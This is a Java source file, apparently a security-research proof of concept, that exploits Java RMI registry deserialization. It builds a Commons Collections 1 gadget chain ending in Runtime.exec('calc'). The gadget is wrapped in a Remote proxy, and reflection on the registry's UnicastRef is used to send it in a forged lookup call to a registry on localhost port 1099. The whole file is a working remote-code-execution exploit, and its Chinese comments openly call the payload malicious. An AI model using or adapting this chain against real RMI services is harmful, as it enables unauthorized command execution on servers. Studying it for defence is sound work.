import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import sun.rmi.server.UnicastRef;

import java.io.ObjectOutput;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.rmi.server.RemoteObject;
import java.util.HashMap;
import java.util.Map;

public class AttackRegistryEXP2 {
    public static void main(String[] args) throws Exception{
        // 获取Registry
        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
        // 生成恶意payload
        InvocationHandler invocationHandler = (InvocationHandler) CC1();
        // 将恶意payload包装成Remote代理对象
        Remote remote = (Remote) Proxy.newProxyInstance(
                Remote.class.getClassLoader(),
                new Class[]{ Remote.class },
                invocationHandler
        );
        // 通过反射获取registry代理中的UnicastRef对象（UnicastRef是RMI底层通信的核心组件，负责实际的网络通信）
        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();
        fields_0[0].setAccessible(true);
        UnicastRef ref = (UnicastRef) fields_0[0].get(registry);
        // 通过反射获取Registry的操作方法数组（Operation数组定义了RMI支持的所有操作（bind、lookup、rebind等））
        Field[] fields_1 = registry.getClass().getDeclaredFields();
        fields_1[0].setAccessible(true);
        Operation[] operations = (Operation[]) fields_1[0].get(registry);
        // 创建远程调用对象，操作码2对应lookup方法，最后的长整型是接口哈希值，用于RMI协议识别
//        RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
        RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 4, 4905912898345647071L);
        // 直接向输出流写入恶意对象，绕过lookup方法的String参数限制
        ObjectOutput var3 = var2.getOutputStream();
        var3.writeObject(remote);
        // 发送伪造的lookup请求，触发注册中心的反序列化漏洞
        ref.invoke(var2);
    }
    public static Object CC1() throws Exception{
        String command = "calc";
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{command})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","value");
        Map decorator = TransformedMap.decorate(map,null,chainedTransformer);
        Class<?> annotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        Object annotationInvocationHandler = annotationInvocationHandlerConstructor.newInstance(Target.class,decorator);
        return annotationInvocationHandler;
    }
}
